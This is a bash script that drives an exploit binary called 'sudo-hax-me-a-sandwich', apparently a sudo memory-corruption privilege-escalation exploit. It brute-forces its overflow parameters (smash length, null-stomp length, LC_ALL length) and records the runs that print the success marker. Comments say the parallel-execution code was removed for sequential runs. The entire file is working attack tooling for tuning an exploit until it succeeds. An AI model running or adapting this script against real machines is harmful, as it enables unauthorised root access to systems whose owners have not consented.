#!/bin/bash

try_brute() {
    local line_data="$1" # Use local variable for clarity
    local IDX ALEN BLEN NLEN LCLEN OFN R

    # Use IFS and read for more efficient parsing if desired, or stick to awk
    # For simplicity and directness from original, keeping awk for now:
    IDX=$(echo "$line_data" | awk -F ':' '{ print $1 }')
    ALEN=$(echo "$line_data" | awk -F ':' '{ print $2 }')
    BLEN=$(echo "$line_data" | awk -F ':' '{ print $3 }')
    NLEN=$(echo "$line_data" | awk -F ':' '{ print $4 }')
    LCLEN=$(echo "$line_data" | awk -F ':' '{ print $5 }')

    OFN="out/$(printf "%08d" "$IDX").txt"

    # Optional: Provide some feedback about which attempt is running
    echo "Attempting IDX: $IDX, ALEN: $ALEN, BLEN: $BLEN, NLEN: $NLEN, LCLEN: $LCLEN"

    # Run the command
    # The subshell for timeout is good practice
    (
        timeout 2 stdbuf -oL ./sudo-hax-me-a-sandwich "$ALEN" "$BLEN" "$NLEN" "$LCLEN" 2>&1
    ) > "$OFN"

    # Check for success
    # Using grep -q for checking existence is more efficient if you don't need the output immediately
    if grep -q "bl1ng" "$OFN"; then
        echo "SUCCESS for IDX: $IDX"
        echo "==================" >> success.txt
        # grep -B999 might be excessive, but keeping original logic
        grep -B999 "bl1ng" "$OFN" >> success.txt
    else
        echo "NOPE for IDX: $IDX"
    fi

    rm -f "${OFN}"
}

# Removed the block that handles invocation by 'parallel':
# if [ "$#" == "1" ]; then
#     N=`echo "$1" | awk -F ':' '{ print NF }'`
#     if [ "$N" == 5 ]; then
#         try_brute "$1"
#         exit 0
#     fi
# fi

if [ "$#" != "6" ]; then
    echo "usage: $0 <smash_min> <smash_max> <null_min> <null_max> <lc_min> <lc_max>"
    exit 0
fi

# Removed the check for GNU parallel:
# if ! [ -x "$(command -v parallel)" ]; then
#     echo "error: gnu parallel not found"
#     exit 1
# fi

smash_min=$1
smash_max=$2
null_min=$3
null_max=$4
lc_min=$5
lc_max=$6

echo "[+] cleaning up.."
rm -rf possib # Keep this, as we'll still generate and read from it
rm -f success.txt
touch success.txt
mkdir -p out 2>/dev/null # Use -p to avoid error if dir exists, and suppress output
# people are likely to forget this
make brute 2>/dev/null

# generate permutations
echo "[+] generating possibilities.."
i=0
# Using a temporary file for possibilities is fine for sequential processing too
for smash_len in $(seq "$smash_min" "$smash_max"); do
for null_stomp_len in $(seq "$null_min" "$null_max"); do
for lc_all_len in $(seq "$lc_min" 10 "$lc_max"); do
    # Use POSIX arithmetic expansion $((...))
    if [ "$((smash_len % 2))" -eq 1 ]; then # More robust comparison
        alen=$(( (smash_len - 1) / 2 ))
        blen=$(( alen + 1 ))
    else
        alen=$(( smash_len / 2 ))
        blen=$alen
    fi

    echo "$i:${alen}:${blen}:${null_stomp_len}:${lc_all_len}" >> possib
    i=$((i + 1))
done
done
done

# start bruting sequentially
echo "[+] lets go (sequentially)..."
total_lines=$(wc -l < possib)
current_line=0
while IFS= read -r line_from_possib; do
    current_line=$((current_line + 1))
    echo "Processing line $current_line of $total_lines from possib..."
    try_brute "$line_from_possib"
done < possib

echo "[+] done"
if [ "$(wc -l < success.txt)" -eq 0 ]; then # More robust check for empty file
    echo "[-] we didnt find any working candidates :("
else
    echo "[+] we found some goodies (saved in success.txt):"
    cat success.txt
fi

# Optional: clean up possib file if no longer needed
# rm -f possib
